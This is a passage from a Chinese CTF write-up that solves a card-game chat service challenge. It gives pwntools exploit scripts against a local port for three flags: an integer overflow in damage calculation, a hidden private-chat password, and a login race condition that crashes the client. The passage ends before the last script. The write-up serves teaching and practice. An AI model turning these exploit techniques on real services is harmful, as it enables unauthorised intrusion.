class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;111111&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;你已退出登录注册界面&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="string">&quot;Chart&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="string">&quot;back&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;Bot&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;222222&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;你已退出登录注册界面&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="string">&quot;Chart&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;(UID:&quot;</span>)</span><br><span class="line">uid = <span class="built_in">eval</span>(ru(<span class="string">&quot;:&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;uid &gt;&gt; &quot;</span> + <span class="built_in">str</span>(uid))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(<span class="string">&quot;back&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;Secret&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;欢迎进入私聊模式&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(uid))</span><br><span class="line">sl(<span class="string">&quot;RemoteVIPApplicationCertificationHasPassed&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - flag3</strong></p>
<p>第三个 flag 出现在一个简单游戏中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(info[<span class="number">1</span>],<span class="string">&quot;Start&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> cha=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sk=<span class="number">0</span>;</span><br><span class="line">    cha=atoi(info[<span class="number">3</span>]);</span><br><span class="line">    sk=atoi(info[<span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">int</span> check=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pNode-&gt;characters[cha],cNode[i].name)&amp;&amp;( (sk&gt;=<span class="number">0</span>) &amp;&amp; (sk&lt;=<span class="number">1</span>) &amp;&amp;( (cha&gt;=<span class="number">0</span>) &amp;&amp; (cha&lt;=pNode-&gt;characters_count))))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res=cNode[<span class="number">4</span>].blood-(-cNode[i].skill_hurt[sk]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hurt:%d\n&quot;</span>,res);</span><br><span class="line">            <span class="keyword">if</span>(res&lt;=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> *flag;</span><br><span class="line">                FILE *file = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_THREE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Could not open flag file.\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">                <span class="keyword">long</span> fsize = ftell(file);</span><br><span class="line">                fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">                flag = <span class="built_in">malloc</span>(fsize + <span class="number">1</span>);</span><br><span class="line">                fread(flag, fsize, <span class="number">1</span>, file);</span><br><span class="line">                fclose(file);</span><br><span class="line">                flag[fsize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="built_in">strcpy</span>(msgs.message,flag);</span><br><span class="line">                send(pNode-&gt;fd, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">                pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">                check=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(msgs.message,<span class="string">&quot;YOU LOSE!&quot;</span>);</span><br><span class="line">        send(pNode-&gt;fd, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cNode[4].blood</code> 和 <code>cNode[i].skill_hurt[sk]</code> 都是正值，必须令 res 溢出为负数</li>
</ul>
<p>查看角色的数据，发现只有 <code>H3h3QAQ</code> 的 <code>skill_hurt[1]</code> 符合条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(cNode[<span class="number">0</span>].name,<span class="string">&quot;H3h3QAQ&quot;</span>);</span><br><span class="line">cNode[<span class="number">0</span>].skill[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">cNode[<span class="number">0</span>].skill[<span class="number">1</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(cNode[<span class="number">0</span>].skill[<span class="number">0</span>],<span class="string">&quot;自动化渗透木马&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(cNode[<span class="number">0</span>].skill[<span class="number">1</span>],<span class="string">&quot;log4j&quot;</span>);</span><br><span class="line">cNode[<span class="number">0</span>].skill_hurt[<span class="number">0</span>]=<span class="number">10</span>;</span><br><span class="line">cNode[<span class="number">0</span>].skill_hurt[<span class="number">1</span>]=<span class="number">2047483649</span>;</span><br><span class="line">cNode[<span class="number">0</span>].level=<span class="number">0</span>;</span><br><span class="line">cNode[<span class="number">0</span>].how_much=<span class="number">-100</span>;</span><br><span class="line">cNode[<span class="number">0</span>].blood=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>在 Shop 中没法购买 <code>H3h3QAQ</code>，只能在 RollCard 中 Roll 出来</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;(均为6个字符)&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;yhw123&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;你已退出登录注册界面&quot;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;RollCard&quot;</span>)</span><br><span class="line">index = <span class="number">0</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    sl(<span class="string">&quot;Roll&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;恭喜你抽到了&quot;</span>)</span><br><span class="line">    name = ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;H3h3QAQ&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;back&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;Start&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;T佬&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(index+<span class="number">3</span>))</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - flag4</strong></p>
<p>第四个 flag 在 safebox 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(choice,<span class="string">&quot;Safe_Mode_Key&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;This is your key!&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *flag;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_FOUR&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not open flag file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> fsize = ftell(file);</span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">malloc</span>(fsize + <span class="number">1</span>);</span><br><span class="line">    fread(flag, fsize, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    flag[fsize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进入 “安全模式” 输入 “Safe_Mode_Key” 即可拿到 flag</li>
</ul>
<p>想要进入安全模式，必须先令程序崩溃：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建子进程</span></span><br><span class="line">fp = popen(<span class="string">&quot;/home/ctf/client&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;popen&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续交互直到子进程崩溃</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 读取子进程输出</span></span><br><span class="line">    <span class="keyword">if</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), fp) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 子进程崩溃或结束</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印子进程输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>令程序崩溃的方法正是条件竞争：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;欢迎注册&amp;登录Nep CardFight system&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;请按次序输入用户名和密码(均为6个字符)&quot;</span>);</span><br><span class="line">    pthread_create(&amp;pthreadSend, <span class="literal">NULL</span>, login_pthread_send, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;pthreadRecv, <span class="literal">NULL</span>, login_pthread_recv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!quit)</span><br><span class="line">        ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当程序创建两个线程后会执行 while 自旋（类似于自旋锁）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(msg.message,<span class="string">&quot;true&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    quit = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg.message, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg.message));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;你已退出登录注册界面&quot;</span>);</span><br><span class="line">    login_or_not=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>login_pthread_recv</code> 函数快执行完时，会设置 <code>quit = true</code> 从而使主线程继续执行</li>
<li>如果在正常执行 login 流程的同时输入大量垃圾数据，就可能导致服务端崩溃，进而导致客户端的 recv 死锁（具体原因不清楚）</li>
</ul>
<p>完整 exp 如下：</p>
